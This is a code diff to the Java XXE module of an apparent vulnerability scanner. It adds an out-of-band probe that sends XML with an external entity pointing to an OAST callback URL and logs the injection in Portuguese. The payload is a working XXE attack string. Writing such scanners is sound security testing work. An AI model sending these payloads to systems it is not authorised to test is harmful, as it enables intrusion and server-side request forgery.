@@ -4,6 +4,8 @@ import gg.effront.anarcry.model.Finding;
 import gg.effront.anarcry.model.Severity;
 import gg.effront.anarcry.scanner.ScanContext;
 import gg.effront.anarcry.scanner.Scanner;
+import gg.effront.anarcry.scanner.oast.OastCorrelator;
+import gg.effront.anarcry.scanner.oast.OastPayload;
 import gg.effront.anarcry.scanner.util.Http;
 import gg.effront.anarcry.scanner.util.CircuitBreakerException;
 import gg.effront.anarcry.scanner.util.TlsUtil;
@@ -113,6 +115,20 @@ public class XxeModule implements Scanner {
                                     + "processo do servidor para redes internas (iptables egress rules)",
                             CWE_ID, CWE_TITLE, VECTOR_SSRF, SCORE_SSRF));
                     break;
+                }
+
+                // Probe 3: OOB XXE via OAST -- external DTD callback
+                OastCorrelator oast = ctx.oastCorrelator();
+                if (oast != null && !oast.callbackBaseUrl().isEmpty()) {
+                    String payloadId = OastCorrelator.generatePayloadId();
+                    String callbackUrl = oast.callbackUrl(payloadId);
+                    String xxeOob = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                            + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"" + callbackUrl + "\">]>\n"
+                            + "<root><data>&xxe;</data></root>";
+                    oast.registerPayload(
+                            new OastPayload(payloadId, id(), path, "xml-body", xxeOob, System.currentTimeMillis()));
+                    sendXml(ctx, hc, url, xxeOob);
+                    log.accept("[~] XXE: OOB payload injetado em " + path + " (payload " + payloadId + ")");
                 }
             }
         }
